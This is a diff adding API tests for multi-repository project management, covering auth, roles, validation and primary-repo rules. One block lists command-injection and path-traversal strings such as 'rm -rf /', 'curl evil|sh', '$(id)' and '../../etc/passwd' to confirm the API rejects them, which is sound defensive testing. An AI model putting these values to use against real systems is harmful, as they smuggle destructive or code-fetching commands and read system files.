@@ -968,3 +968,706 @@ describe('admin tracker-migration routes', () => {
     });
   });
 });
+
+// ===========================================================================
+// Multi-repo repository management tests (multi-repo feature, PR #183)
+// ===========================================================================
+// ---------------------------------------------------------------------------
+// Helpers shared across repos tests
+// ---------------------------------------------------------------------------
+
+const reposEvent = (method, projectId, extra = {}) => ({
+  httpMethod: method,
+  path: `/projects/${projectId}/repos`,
+  pathParameters: { projectId },
+  ...extra,
+});
+
+describe('GET /projects/:id/repos', () => {
+  it('returns 401 when sub is missing', async () => {
+    const res = await handler({
+      ...reposEvent('GET', 'any'),
+      requestContext: {},
+    });
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Unauthorized' });
+  });
+
+  it('returns 403 when the caller is not a member', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const outsiderSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    const res = await handler({
+      ...reposEvent('GET', id),
+      ...claims(outsiderSub),
+    });
+    expect(res.statusCode).toBe(403);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Access denied' });
+  });
+
+  it('returns 200 with empty list for a project with no repos', async () => {
+    const sub = `u-${randomUUID()}`;
+    // Create project without a gitRepo so no repo vertex is seeded
+    const { id } = await createProject(sub, { name: 'Empty' });
+    const res = await handler({
+      ...reposEvent('GET', id),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual([]);
+  });
+
+  it('returns 200 with repos list for a project that has repos', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub, { name: 'HasRepo', gitRepo: 'owner/repo-a' });
+    const res = await handler({
+      ...reposEvent('GET', id),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(200);
+    const repos = JSON.parse(res.body);
+    expect(repos).toHaveLength(1);
+    expect(repos[0]).toMatchObject({ url: 'owner/repo-a', role: 'primary' });
+  });
+
+  it('lazily migrates a legacy gitRepo on first GET', async () => {
+    const sub = `u-${randomUUID()}`;
+    // Seed a project directly with a legacy git_repo via PUT (no repos[] yet)
+    const { id } = await createProject(sub, { name: 'Legacy', gitRepo: 'legacy/migrated' });
+
+    // Confirm repos list reflects the migrated value
+    const res = await handler({
+      ...reposEvent('GET', id),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(200);
+    const repos = JSON.parse(res.body);
+    expect(repos.some((r) => r.url === 'legacy/migrated')).toBe(true);
+  });
+
+  it('allows a plain member to read repos', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const memberSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub, { name: 'MemberRead' });
+    await addMember(id, memberSub, 'member');
+    const res = await handler({
+      ...reposEvent('GET', id),
+      ...claims(memberSub),
+    });
+    expect(res.statusCode).toBe(200);
+  });
+});
+
+describe('POST /projects/:id/repos', () => {
+  it('returns 401 when sub is missing', async () => {
+    const res = await handler({
+      ...reposEvent('POST', 'any', { body: JSON.stringify({ url: 'a/b' }) }),
+      requestContext: {},
+    });
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Unauthorized' });
+  });
+
+  it('returns 403 when the caller is not a member', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const outsiderSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    const res = await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'a/b' }) }),
+      ...claims(outsiderSub),
+    });
+    expect(res.statusCode).toBe(403);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Access denied' });
+  });
+
+  it('returns 403 when the caller is a plain member (not owner/admin)', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const memberSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    await addMember(id, memberSub, 'member');
+    const res = await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'a/b' }) }),
+      ...claims(memberSub),
+    });
+    expect(res.statusCode).toBe(403);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Only project owners and admins can add repositories',
+    });
+  });
+
+  it('returns 400 when url is missing', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    const res = await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({}) }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body)).toEqual({ error: 'url is required' });
+  });
+
+  it('returns 400 when url is not in owner/repo format', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    const res = await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'not-valid' }) }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body)).toEqual({ error: 'url must be in owner/repo format' });
+  });
+
+  it('returns 201 and persists the repo for an owner', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub, { name: 'AddRepo' });
+    const res = await handler({
+      ...reposEvent('POST', id, {
+        body: JSON.stringify({ url: 'my-org/my-repo', role: 'secondary' }),
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(201);
+    const created = JSON.parse(res.body);
+    expect(created).toMatchObject({
+      url: 'my-org/my-repo',
+      role: 'secondary',
+      provider: 'github',
+      addedAt: NOW.toISOString(),
+    });
+
+    // Confirm it appears in subsequent GET
+    const listRes = await handler({
+      ...reposEvent('GET', id),
+      ...claims(sub),
+    });
+    const repos = JSON.parse(listRes.body);
+    expect(repos.some((r) => r.url === 'my-org/my-repo')).toBe(true);
+  });
+
+  it('allows admins to add a repo', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const adminSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    await addMember(id, adminSub, 'admin');
+    const res = await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'admin-org/admin-repo' }) }),
+      ...claims(adminSub),
+    });
+    expect(res.statusCode).toBe(201);
+  });
+
+  it('returns 409 on duplicate url', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'dup/repo' }) }),
+      ...claims(sub),
+    });
+    const res = await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'dup/repo' }) }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(409);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Repository already added to this project' });
+  });
+});
+
+describe('DELETE /projects/:id/repos', () => {
+  it('returns 401 when sub is missing', async () => {
+    const res = await handler({
+      ...reposEvent('DELETE', 'any', {
+        queryStringParameters: { url: 'a/b' },
+      }),
+      requestContext: {},
+    });
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Unauthorized' });
+  });
+
+  it('returns 403 when the caller is not a member', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const outsiderSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    const res = await handler({
+      ...reposEvent('DELETE', id, { queryStringParameters: { url: 'a/b' } }),
+      ...claims(outsiderSub),
+    });
+    expect(res.statusCode).toBe(403);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Access denied' });
+  });
+
+  it('returns 403 when the caller is a plain member', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const memberSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    await addMember(id, memberSub, 'member');
+    const res = await handler({
+      ...reposEvent('DELETE', id, { queryStringParameters: { url: 'a/b' } }),
+      ...claims(memberSub),
+    });
+    expect(res.statusCode).toBe(403);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Only project owners and admins can remove repositories',
+    });
+  });
+
+  it('returns 400 when url query param is missing', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    const res = await handler({
+      ...reposEvent('DELETE', id),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body)).toEqual({ error: 'url query parameter is required' });
+  });
+
+  it('returns 404 when the repo does not exist on the project', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    const res = await handler({
+      ...reposEvent('DELETE', id, { queryStringParameters: { url: 'ghost/repo' } }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(404);
+    expect(JSON.parse(res.body)).toEqual({ error: 'Repository not found on this project' });
+  });
+
+  it('returns 200 and removes the repo for an owner', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    // Add a repo first
+    await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'del-org/del-repo' }) }),
+      ...claims(sub),
+    });
+    // Now delete it
+    const res = await handler({
+      ...reposEvent('DELETE', id, {
+        queryStringParameters: { url: 'del-org/del-repo' },
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual({ removed: 'del-org/del-repo' });
+
+    // Confirm it no longer appears in GET
+    const listRes = await handler({
+      ...reposEvent('GET', id),
+      ...claims(sub),
+    });
+    const repos = JSON.parse(listRes.body);
+    expect(repos.some((r) => r.url === 'del-org/del-repo')).toBe(false);
+  });
+
+  it('allows admins to remove a repo', async () => {
+    const ownerSub = `u-${randomUUID()}`;
+    const adminSub = `u-${randomUUID()}`;
+    const { id } = await createProject(ownerSub);
+    await addMember(id, adminSub, 'admin');
+    await handler({
+      ...reposEvent('POST', id, { body: JSON.stringify({ url: 'admin-org/remove-me' }) }),
+      ...claims(ownerSub),
+    });
+    const res = await handler({
+      ...reposEvent('DELETE', id, {
+        queryStringParameters: { url: 'admin-org/remove-me' },
+      }),
+      ...claims(adminSub),
+    });
+    expect(res.statusCode).toBe(200);
+  });
+
+  it('preserves the repository vertex when another project still references it', async () => {
+    const sharedRepo = `org/shared-${randomUUID()}`;
+    const ownerA = `u-${randomUUID()}`;
+    const ownerB = `u-${randomUUID()}`;
+    const first = await createProject(ownerA, {
+      name: 'First',
+      repos: [{ url: sharedRepo, role: 'primary' }],
+    });
+    const second = await createProject(ownerB, {
+      name: 'Second',
+      repos: [{ url: sharedRepo, role: 'primary' }],
+    });
+
+    const res = await handler({
+      ...reposEvent('DELETE', first.id, {
+        queryStringParameters: { url: sharedRepo },
+      }),
+      ...claims(ownerA),
+    });
+
+    expect(res.statusCode).toBe(200);
+
+    const secondRepos = await handler({
+      ...reposEvent('GET', second.id),
+      ...claims(ownerB),
+    });
+    expect(secondRepos.statusCode).toBe(200);
+    expect(JSON.parse(secondRepos.body)).toEqual(
+      expect.arrayContaining([expect.objectContaining({ url: sharedRepo })]),
+    );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Injection / validation guards — regression tests for the shell-safety and
+// owner/repo patterns. If a future change relaxes these regexes, these fail.
+// ---------------------------------------------------------------------------
+
+describe('repo URL validation (injection guards)', () => {
+  const MALICIOUS = [
+    'owner/repo;rm -rf /',
+    'owner/repo && curl evil',
+    'owner/repo`id`',
+    'owner/repo$(id)',
+    'owner/repo|sh',
+    '../../etc/passwd',
+    'owner/repo with spaces',
+    'owner/"repo"',
+  ];
+
+  it('rejects malicious urls on POST /repos with 400', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub, { name: 'Inj' });
+    for (const url of MALICIOUS) {
+      const res = await handler({
+        ...reposEvent('POST', id, { body: JSON.stringify({ url }) }),
+        ...claims(sub),
+      });
+      expect(res.statusCode, `expected 400 for ${JSON.stringify(url)}`).toBe(400);
+      expect(JSON.parse(res.body)).toEqual({ error: 'url must be in owner/repo format' });
+    }
+  });
+
+  it('rejects an unsafe legacy gitRepo on POST /projects with 400', async () => {
+    const sub = `u-${randomUUID()}`;
+    const res = await handler({
+      httpMethod: 'POST',
+      body: JSON.stringify({ name: 'Bad', gitRepo: 'owner/repo;curl evil|sh' }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body).error).toMatch(/Invalid gitRepo/);
+  });
+
+  it('rejects a traversal legacy gitRepo (..) on POST /projects with 400', async () => {
+    const sub = `u-${randomUUID()}`;
+    const res = await handler({
+      httpMethod: 'POST',
+      body: JSON.stringify({ name: 'Trav', gitRepo: '../../etc/passwd' }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body).error).toMatch(/Invalid gitRepo/);
+  });
+
+  it('rejects an invalid role on POST /repos with 400', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    const res = await handler({
+      ...reposEvent('POST', id, {
+        body: JSON.stringify({ url: 'org/repo', role: 'not-a-role' }),
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body).error).toMatch(/Invalid role/);
+  });
+
+  it('rejects an invalid provider on POST /repos with 400', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub);
+    const res = await handler({
+      ...reposEvent('POST', id, {
+        body: JSON.stringify({ url: 'org/repo', provider: 'bitbucket' }),
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body).error).toMatch(/Invalid provider/);
+  });
+});
+
+describe('POST /projects with repos[] array', () => {
+  it('creates multiple Repository vertices and returns them', async () => {
+    const sub = `u-${randomUUID()}`;
+    const created = await createProject(sub, {
+      name: 'Multi',
+      repos: [
+        { url: 'org/web', role: 'frontend' },
+        { url: 'org/api', role: 'backend' },
+        { url: 'org/core', role: 'primary' },
+      ],
+    });
+    expect(created.repos).toHaveLength(3);
+    const byUrl = Object.fromEntries(created.repos.map((r) => [r.url, r]));
+    expect(byUrl['org/web'].role).toBe('frontend');
+    expect(byUrl['org/api'].role).toBe('backend');
+    // Primary repo drives the legacy gitRepo field.
+    expect(created.gitRepo).toBe('org/core');
+
+    // Confirm all three are persisted and returned by the repos route.
+    const listRes = await handler({
+      ...reposEvent('GET', created.id),
+      ...claims(sub),
+    });
+    const repos = JSON.parse(listRes.body);
+    expect(repos.map((r) => r.url).sort()).toEqual(['org/api', 'org/core', 'org/web']);
+  });
+
+  it('rejects the whole create when any repos[] url is invalid (400)', async () => {
+    const sub = `u-${randomUUID()}`;
+    const res = await handler({
+      httpMethod: 'POST',
+      body: JSON.stringify({
+        name: 'BadArr',
+        repos: [{ url: 'org/good' }, { url: 'bad;rm -rf' }],
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body).error).toMatch(/Invalid repository url/);
+  });
+
+  it('rejects a non-array repos payload with 400', async () => {
+    const sub = `u-${randomUUID()}`;
+    const res = await handler({
+      httpMethod: 'POST',
+      body: JSON.stringify({
+        name: 'BadReposType',
+        repos: { url: 'org/repo' },
+      }),
+      ...claims(sub),
+    });
+
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body)).toEqual({ error: 'repos must be an array' });
+  });
+
+  it('rejects repos[] with an invalid role (400)', async () => {
+    const sub = `u-${randomUUID()}`;
+    const res = await handler({
+      httpMethod: 'POST',
+      body: JSON.stringify({
+        name: 'BadRole',
+        repos: [{ url: 'org/repo', role: 'wat' }],
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(400);
+    expect(JSON.parse(res.body).error).toMatch(/Invalid role/);
+  });
+
+  it('promotes the selected main repository without leaving two primary repos', async () => {
+    const sub = `u-${randomUUID()}`;
+    const created = await createProject(sub, {
+      name: 'MainRepoSwitch',
+      repos: [
+        { url: 'org/old-main', role: 'primary' },
+        { url: 'org/other', role: 'secondary' },
+      ],
+    });
+
+    const updateRes = await handler({
+      httpMethod: 'PUT',
+      path: `/projects/${created.id}`,
+      pathParameters: { projectId: created.id },
+      body: JSON.stringify({ gitRepo: 'org/other' }),
+      ...claims(sub),
+    });
+
+    expect(updateRes.statusCode).toBe(200);
+
+    const getRes = await handler({
+      httpMethod: 'GET',
+      path: `/projects/${created.id}`,
+      pathParameters: { projectId: created.id },
+      ...claims(sub),
+    });
+
+    expect(getRes.statusCode).toBe(200);
+    const project = JSON.parse(getRes.body);
+    expect(project.gitRepo).toBe('org/other');
+
+    const primaryRepos = project.repos.filter((repo) => repo.role === 'primary');
+    expect(primaryRepos).toHaveLength(1);
+    expect(primaryRepos[0].url).toBe('org/other');
+    expect(project.repos).toEqual(
+      expect.arrayContaining([expect.objectContaining({ url: 'org/old-main', role: 'secondary' })]),
+    );
+  });
+});
+
+describe('POST /repos persists provider + role overrides', () => {
+  it('round-trips a non-default provider and role', async () => {
+    const sub = `u-${randomUUID()}`;
+    const { id } = await createProject(sub, { name: 'Override' });
+    const res = await handler({
+      ...reposEvent('POST', id, {
+        body: JSON.stringify({ url: 'org/lib', provider: 'gitlab', role: 'shared' }),
+      }),
+      ...claims(sub),
+    });
+    expect(res.statusCode).toBe(201);
+    expect(JSON.parse(res.body)).toMatchObject({
+      url: 'org/lib',
+      provider: 'gitlab',
+      role: 'shared',
+    });
+
+    const listRes = await handler({ ...reposEvent('GET', id), ...claims(sub) });
+    const added = JSON.parse(listRes.body).find((r) => r.url === 'org/lib');
+    expect(added).toMatchObject({ provider: 'gitlab', role: 'shared' });
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Review follow-ups: primary-role invariant + shared-vertex safety across all
+// entry points (project DELETE, POST add-repo, create, delete promotion).
+// ---------------------------------------------------------------------------
+
+describe('single-primary invariant across entry points', () => {
+  it('demotes the existing primary when POST /repos adds a new primary', async () => {
+    const sub = `u-${randomUUID()}`;
+    const created = await createProject(sub, {
+      name: 'AddPrimary',
+      repos: [{ url: 'org/old-main', role: 'primary' }],
+    });
+    expect(created.gitRepo).toBe('org/old-main');
+
+    const addRes = await handler({
+      ...reposEvent('POST', created.id, {
+        body: JSON.stringify({ url: 'org/new-main', role: 'primary' }),
+      }),
+      ...claims(sub),
+    });
+    expect(addRes.statusCode).toBe(201);
+
+    const getRes = await handler({
+      httpMethod: 'GET',
+      path: `/projects/${created.id}`,
+      pathParameters: { projectId: created.id },
+      ...claims(sub),
+    });
+    const project = JSON.parse(getRes.body);
+    const primaries = project.repos.filter((r) => r.role === 'primary');
+    expect(primaries).toHaveLength(1);
+    expect(primaries[0].url).toBe('org/new-main');
+    expect(project.gitRepo).toBe('org/new-main');
+  });
+
+  it('normalizes to a single primary when create supplies multiple primaries', async () => {
+    const sub = `u-${randomUUID()}`;
+    const created = await createProject(sub, {
+      name: 'MultiPrimary',
+      repos: [
+        { url: 'org/a', role: 'primary' },
+        { url: 'org/b', role: 'primary' },
+      ],
+    });
+
+    const getRes = await handler({
+      httpMethod: 'GET',
+      path: `/projects/${created.id}`,
+      pathParameters: { projectId: created.id },
+      ...claims(sub),
+    });
+    const project = JSON.parse(getRes.body);
+    const primaries = project.repos.filter((r) => r.role === 'primary');
+    expect(primaries).toHaveLength(1);
+    expect(project.gitRepo).toBe(primaries[0].url);
+  });
+
+  it('promotes exactly one remaining repo after deleting the primary', async () => {
+    const sub = `u-${randomUUID()}`;
+    const created = await createProject(sub, {
+      name: 'DeletePrimary',
+      repos: [
+        { url: 'org/main', role: 'primary' },
+        { url: 'org/lib', role: 'secondary' },
+      ],
+    });
+
+    const delRes = await handler({
+      ...reposEvent('DELETE', created.id, {
+        queryStringParameters: { url: 'org/main' },
+      }),
+      ...claims(sub),
+    });
+    expect(delRes.statusCode).toBe(200);
+
+    const getRes = await handler({
+      httpMethod: 'GET',
+      path: `/projects/${created.id}`,
+      pathParameters: { projectId: created.id },
+      ...claims(sub),
+    });
+    const project = JSON.parse(getRes.body);
+    const primaries = project.repos.filter((r) => r.role === 'primary');
+    expect(primaries).toHaveLength(1);
+    expect(primaries[0].url).toBe('org/lib');
+    expect(project.gitRepo).toBe('org/lib');
+  });
+
+  it('clears git_repo when the last repo is deleted', async () => {
+    const sub = `u-${randomUUID()}`;
+    const created = await createProject(sub, {
+      name: 'DeleteLast',
+      repos: [{ url: 'org/only', role: 'primary' }],
+    });
+
+    const delRes = await handler({
+      ...reposEvent('DELETE', created.id, {
+        queryStringParameters: { url: 'org/only' },
+      }),
+      ...claims(sub),
+    });
+    expect(delRes.statusCode).toBe(200);
+
+    const getRes = await handler({
+      httpMethod: 'GET',
+      path: `/projects/${created.id}`,
+      pathParameters: { projectId: created.id },
+      ...claims(sub),
+    });
+    const project = JSON.parse(getRes.body);
+    expect(project.repos).toEqual([]);
+    expect(project.gitRepo).toBe('');
+  });
+});
+
+describe('shared Repository vertex safety on project DELETE', () => {
+  it('keeps a shared repo intact for other projects when one project is deleted', async () => {
+    const sharedRepo = `org/shared-${randomUUID()}`;
+    const ownerA = `u-${randomUUID()}`;
+    const ownerB = `u-${randomUUID()}`;
+    const first = await createProject(ownerA, {
+      name: 'First',
+      repos: [{ url: sharedRepo, role: 'primary' }],
+    });
+    const second = await createProject(ownerB, {
+      name: 'Second',
+      repos: [{ url: sharedRepo, role: 'primary' }],
+    });
+
+    const delRes = await handler({
+      httpMethod: 'DELETE',
+      path: `/projects/${first.id}`,
+      pathParameters: { projectId: first.id },
+      ...claims(ownerA),
+    });
+    expect(delRes.statusCode).toBe(204);
+
+    // The surviving project must still see the shared repo and not break.
+    const listRes = await handler({
+      ...reposEvent('GET', second.id),
+      ...claims(ownerB),
+    });
+    expect(listRes.statusCode).toBe(200);
+    expect(JSON.parse(listRes.body)).toEqual(
+      expect.arrayContaining([expect.objectContaining({ url: sharedRepo })]),
+    );
+  });
+});
